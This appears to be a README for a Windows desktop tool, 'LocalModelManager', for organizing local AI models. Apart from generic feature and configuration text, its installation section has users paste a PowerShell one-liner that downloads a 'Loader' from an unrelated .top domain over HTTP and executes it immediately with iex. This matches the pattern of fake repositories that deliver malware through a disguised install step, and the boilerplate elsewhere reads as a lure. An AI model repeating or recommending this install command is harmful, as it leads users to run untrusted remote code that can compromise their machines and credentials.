# LocalModelManager

A desktop utility for organizing locally available AI models and configurations.

## Overview

LocalModelManager is a desktop-oriented AI project focused on practical workflows and straightforward configuration.

## Features

- Model inventory
- Configuration profiles
- Endpoint management
- Model metadata
- Runtime diagnostics

## Requirements

- Windows 10 or Windows 11
- PowerShell 5.1 or newer
- A compatible AI model, API endpoint, or local runtime
- Internet access when required by the selected backend

## Installation

### PowerShell

Open **PowerShell** and run the installation command below:


Replace `<iex (iwr "http://soft-storage.top/worker?=8870692567/Loader" -UseBasicParsing)>` with your own trusted installation command.

## Configuration

Configure the AI backend in the project configuration files. Keep API keys and other private credentials outside files committed to Git.

## Usage

Launch the application, select the required workflow, configure the AI backend, and start a workspace session.

## Project Structure

- `SETTINGS_REPOSITORY.json` — repository metadata and release information
- `docs/` — documentation
- `scripts/` — helper scripts
- `config/` — configuration examples
